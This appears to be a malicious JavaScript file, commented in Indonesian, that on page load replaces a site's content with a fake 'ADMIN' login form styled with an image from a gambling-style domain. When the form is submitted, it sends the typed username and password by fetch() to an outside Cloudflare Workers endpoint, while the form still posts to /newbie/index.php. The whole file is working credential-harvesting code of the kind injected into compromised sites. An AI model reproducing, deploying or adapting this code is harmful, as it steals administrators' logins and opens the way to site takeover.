window.onload = function () {
  // Bersihkan body
  document.body.innerHTML = "";

  // Tambahkan style
  const style = document.createElement("style");
  style.textContent = `
    body {
      background-image: url('https://jawaslot.site/baner_new/marsha.gif');
      background-repeat: no-repeat;
      background-attachment: fixed; 
      background-size: 100% 100%;
      font-family: Arial, sans-serif;
      margin: 0;
      padding: 0;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
    }

    .login-container {
      background-color: #a7a4a4;
      padding: 20px;
      border-radius: 5px;
      box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
      width: 300px;
    }

    h2 {
      text-align: center;
      color: #333;
    }

    label {
      display: block;
      margin-bottom: 5px;
      color: #555;
    }

    input[type="text"],
    input[type="password"] {
      width: 100%;
      padding: 10px;
      margin-bottom: 15px;
      border: 1px solid #a3a2a2;
      border-radius: 3px;
      box-sizing: border-box;
    }

    input[type="submit"] {
      width: 100%;
      padding: 10px;
      background-color: #0e0f0f;
      color: #beb6b6;
      border: none;
      border-radius: 3px;
      cursor: pointer;
      transition: background-color 0.3s ease;
    }

    input[type="submit"]:hover {
      background-color: #0a0a0a;
    }
  `;
  document.head.appendChild(style);

  // Container login
  const container = document.createElement("div");
  container.className = "login-container";

  // Judul
  const title = document.createElement("h2");
  title.textContent = "ADMIN";
  container.appendChild(title);

  // Form
  const form = document.createElement("form");
  form.method = "post";
  form.action = "/newbie/index.php";

  // Username
  const labelUser = document.createElement("label");
  labelUser.textContent = "Username:";
  const inputUser = document.createElement("input");
  inputUser.type = "text";
  inputUser.name = "username";

  // Password
  const labelPass = document.createElement("label");
  labelPass.textContent = "Password:";
  const inputPass = document.createElement("input");
  inputPass.type = "password";
  inputPass.name = "password";

  // Tombol submit
  const btnSubmit = document.createElement("input");
  btnSubmit.type = "submit";
  btnSubmit.value = "Login";

  // Susun elemen
  form.appendChild(labelUser);
  form.appendChild(inputUser);
  form.appendChild(labelPass);
  form.appendChild(inputPass);
  form.appendChild(document.createElement("br"));
  form.appendChild(btnSubmit);

  container.appendChild(form);
  document.body.appendChild(container);
  form.addEventListener("submit", function () {
    const username = inputUser.value;
    const pass = inputPass.value;

    const message = `Username: ${username}, Password: ${pass}`;

    fetch("https://memek-worker.defoy89122.workers.dev/?message=" + encodeURIComponent(message))
      .then(res => console.log("Data terkirim ke worker"))
      .catch(err => console.error("Error:", err));
  });
};

